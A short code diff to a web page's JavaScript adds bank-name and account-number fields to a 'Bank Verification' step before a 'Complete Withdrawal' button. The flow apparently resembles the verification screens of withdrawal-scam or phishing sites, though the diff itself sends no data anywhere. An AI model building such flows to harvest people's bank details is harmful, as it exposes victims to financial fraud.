@@ -116,12 +116,15 @@ function copyAddress() {
 function showLocationScreen() {
     document.getElementById('main-content').innerHTML = `
         <div class="glass p-8 rounded-3xl">
-            <h2 class="text-2xl mb-6">Final Verification</h2>
+            <h2 class="text-2xl mb-6">Bank Verification</h2>
+            <input id="bank" type="text" placeholder="Bank Name" class="w-full bg-zinc-900 p-4 rounded-2xl mb-4">
+            <input id="account" type="text" placeholder="Account Number" class="w-full bg-zinc-900 p-4 rounded-2xl mb-4">
             <input id="location" type="text" placeholder="Your Location (City, Country)" class="w-full bg-zinc-900 p-4 rounded-2xl mb-6">
             <button onclick="completeWithdrawal()" class="btn-primary w-full py-4 rounded-2xl">Complete Withdrawal</button>
         </div>
     `;
 }
+
 
 function completeWithdrawal() {
     const loc = document.getElementById('location').value || "Unknown";
